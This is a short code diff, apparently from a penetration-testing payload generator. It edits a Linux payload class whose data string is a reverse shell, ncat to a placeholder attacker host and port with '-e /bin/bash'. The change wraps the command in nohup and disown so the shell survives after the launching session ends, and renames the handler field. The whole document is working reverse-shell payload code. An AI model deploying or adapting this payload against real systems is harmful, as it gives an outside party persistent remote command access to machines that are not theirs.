@@ -10,7 +10,7 @@ class Payload:
     }
 
     meta = {
-        'handler' : 'ncat',
+        'handler' : 'netcat',
         'type' : 'ncat',
         'os' : 'linux'  
     }
@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = "ncat *LHOST* *LPORT* -e /bin/bash"
+    data = "nohup ncat *LHOST* *LPORT* -e /bin/bash & disown"
